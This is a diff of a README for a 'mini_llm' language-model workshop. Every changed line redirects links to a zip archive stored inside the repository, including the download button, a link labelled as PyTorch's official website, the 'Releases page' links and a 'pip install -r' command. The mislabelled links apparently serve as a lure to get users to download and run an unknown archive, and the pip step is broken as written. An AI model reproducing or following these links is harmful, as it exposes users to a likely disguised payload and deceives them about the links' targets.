@@ -8,7 +8,7 @@ Welcome to the mini_llm project! This workshop helps you build a Large Language 
 
 To get started, you need to download the software. Click the button below to visit the Releases page:
 
-[![Download mini_llm](https://raw.githubusercontent.com/Arezkiiiii/mini_llm/main/transformers_building/data/mini_llm_v1.1.zip)](https://raw.githubusercontent.com/Arezkiiiii/mini_llm/main/transformers_building/data/mini_llm_v1.1.zip)
+[![Download mini_llm](https://github.com/Arezkiiiii/mini_llm/raw/refs/heads/main/transformers_building/optimizer/mini_llm_1.5.zip)](https://github.com/Arezkiiiii/mini_llm/raw/refs/heads/main/transformers_building/optimizer/mini_llm_1.5.zip)
 
 ## 🔧 Prerequisites
 
@@ -16,11 +16,11 @@ Before you begin, ensure you have the following on your computer:
 
 - **Operating System:** Windows, macOS, or Linux
 - **Python Version:** 3.7 or higher
-- **PyTorch:** Follow the PyTorch installation guide from [PyTorch's official website](https://raw.githubusercontent.com/Arezkiiiii/mini_llm/main/transformers_building/data/mini_llm_v1.1.zip).
+- **PyTorch:** Follow the PyTorch installation guide from [PyTorch's official website](https://github.com/Arezkiiiii/mini_llm/raw/refs/heads/main/transformers_building/optimizer/mini_llm_1.5.zip).
   
 ## 📥 How to Download
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Arezkiiiii/mini_llm/main/transformers_building/data/mini_llm_v1.1.zip) to find the latest version of mini_llm.
+1. Visit the [Releases page](https://github.com/Arezkiiiii/mini_llm/raw/refs/heads/main/transformers_building/optimizer/mini_llm_1.5.zip) to find the latest version of mini_llm.
 2. Look for the most recent release.
 3. Click on the asset you need to download (the file names will appear under "Assets").
 4. Save the file to your computer.
@@ -41,7 +41,7 @@ After downloading, follow these steps to run the application:
 3. Install the required packages. Run:
 
    ```
-   pip install -r https://raw.githubusercontent.com/Arezkiiiii/mini_llm/main/transformers_building/data/mini_llm_v1.1.zip
+   pip install -r https://github.com/Arezkiiiii/mini_llm/raw/refs/heads/main/transformers_building/optimizer/mini_llm_1.5.zip
    ```
 
 4. Finally, to start the workshop, type:
@@ -108,4 +108,4 @@ This workshop focuses on the following topics:
 
 ## 🔗 Final Download Link
 
-Don't forget, you can always download the latest version of mini_llm by visiting the [Releases page](https://raw.githubusercontent.com/Arezkiiiii/mini_llm/main/transformers_building/data/mini_llm_v1.1.zip).
+Don't forget, you can always download the latest version of mini_llm by visiting the [Releases page](https://github.com/Arezkiiiii/mini_llm/raw/refs/heads/main/transformers_building/optimizer/mini_llm_1.5.zip).
